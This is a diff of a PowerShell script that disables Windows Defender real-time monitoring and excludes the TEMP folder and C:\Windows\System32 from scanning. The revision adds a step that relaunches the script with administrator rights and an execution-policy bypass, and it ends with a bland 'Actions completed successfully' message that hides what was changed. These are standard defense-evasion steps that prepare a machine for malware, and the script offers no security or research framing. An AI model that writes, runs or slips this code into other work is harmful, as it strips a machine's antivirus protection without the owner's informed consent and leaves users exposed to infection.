@@ -1,15 +1,19 @@
-# Variables for actions
-$DefenderPreferences = @(
-    "Set-MpPreference -DisableRealtimeMonitoring $true",
-    "Set-MpPreference -ExclusionPath '%TEMP%', 'C:\Windows\System32'"
-)
+# Ensure the script runs with elevated privileges (UAC check)
+$Principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+if (-not $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process powershell "-ExecutionPolicy Bypass -NoProfile -File '$PSCommandPath'" -Verb RunAs
+    exit
+}
 
-# Log the current process and status
-Write-Output "Starting background actions..."
+# Step 1: Disable real-time monitoring
+Set-MpPreference -DisableRealtimeMonitoring $true
 
-# Disable real-time monitoring and add exclusions
-Invoke-Expression ($DefenderPreferences -join "; ")
+# Step 2: Add exclusions for paths in Windows Defender
+Set-MpPreference -ExclusionPath "$env:TEMP", "C:\Windows\System32"
 
-# Notification for completion
-[System.Windows.Forms.MessageBox]::Show("Actions completed successfully.", "Notification", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
-pause
+# Step 3: Notify successful completion using Console-based dialog
+Clear-Host
+Write-Host "Actions completed successfully."
+[System.Console]::WriteLine("")
+[System.Console]::WriteLine("Press Enter to exit...")
+[System.Console]::ReadLine()
